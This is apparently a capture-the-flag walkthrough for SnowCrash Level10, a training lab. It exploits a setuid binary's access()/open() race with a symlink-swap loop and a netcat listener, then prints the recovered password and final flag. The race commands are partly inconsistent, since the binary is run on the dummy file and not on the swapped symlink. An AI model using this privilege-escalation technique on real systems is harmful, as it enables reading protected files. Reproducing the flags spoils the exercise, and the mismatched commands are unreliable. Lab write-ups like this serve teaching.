# 🚩 SnowCrash — Level10

## 🎯 Goal

Find the password for **flag10**.

---

## 1. Check the current directory

```bash
ls -la
```

**Result:**

```
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
```

A setuid binary `level10` and a `token` file we can't read.

---

## 2. Analyze the binary

Run the binary:

```bash
./level10
```

**Output:**

```
./level10 file host
        sends file to host if you have access to it
```

Examine with strings:

```bash
strings level10
```

**Key findings:**

```
access
You don't have access to %s
Connecting to %s:6969
Sending file ..
```

**Analysis:**
- The binary sends a file to a host on port **6969**
- It uses `access()` to check if we have permission to read the file
- Then it opens and sends the file
- **Vulnerability:** TOCTOU (Time-of-Check-Time-of-Use) race condition
- There's a time gap between `access()` checking permissions and `open()` reading the file

---

## 3. Exploit via TOCTOU race condition

**The exploit strategy:**
1. Create a readable dummy file
2. Set up a listener to receive the data
3. Rapidly swap a symlink between the dummy file and the token
4. When timing is right, `access()` checks the dummy file (passes), then `open()` reads the token!

**Terminal 1 - Set up listener:**

```bash
nc -lk 6969
```

**Terminal 2 - Create symlink race loop:**

```bash
touch /tmp/readable
while true; do 
    ln -sf /tmp/readable /tmp/exploit
    ln -sf ~/token /tmp/exploit
done
```

**Terminal 3 - Run the binary repeatedly:**

```bash
while true; do
    ./level10 /tmp/readable 127.0.0.1
done
```

**How it works:**
1. The symlink rapidly alternates between `/tmp/readable` and `~/token`
2. The binary calls `access(/tmp/exploit)` - if it points to `/tmp/readable`, check passes
3. Microseconds later, before `open()` is called, the symlink switches to `~/token`
4. The binary opens and sends the token file with **flag10** privileges
5. The listener receives the token content

---

## 4. Get the token

Watch Terminal 1 (the listener). You'll see output like:

```
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
woupa2yuojeeaaed06riuj63c
```

The token is: `woupa2yuojeeaaed06riuj63c`

Kill the background processes:

```bash
killall level10
kill %1  # Kill the symlink loop
```

---

## 5. Get the flag

Switch to flag10 user:

```bash
su flag10
```

Password: `woupa2yuojeeaaed06riuj63c`

Run getflag:

```bash
getflag
```

---

## ✅ Result

Output:

```
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```

---

## 🎉 **Final Token for Level10**

```
feulo4b72j7edeahuete3no7c
```
